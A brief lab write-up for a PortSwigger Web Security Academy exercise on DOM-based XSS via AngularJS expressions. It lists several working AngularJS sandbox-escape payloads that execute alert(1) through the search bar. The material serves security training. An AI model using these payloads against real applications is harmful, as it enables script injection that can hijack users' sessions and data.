# DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
Lab URL :- `https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression`

Payload in Search bar :-

![image](https://user-images.githubusercontent.com/60841283/153716136-d9f8a934-6355-4865-a32d-ab0615c380cd.png)

```html
{{constructor.constructor('alert(1)')()}}

# Other payloads that works
{{$on.constructor('alert(1)')()}}
{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}
```

![image](https://user-images.githubusercontent.com/60841283/153716154-2e31496d-6588-4f04-afe8-4fa4199ae65b.png)
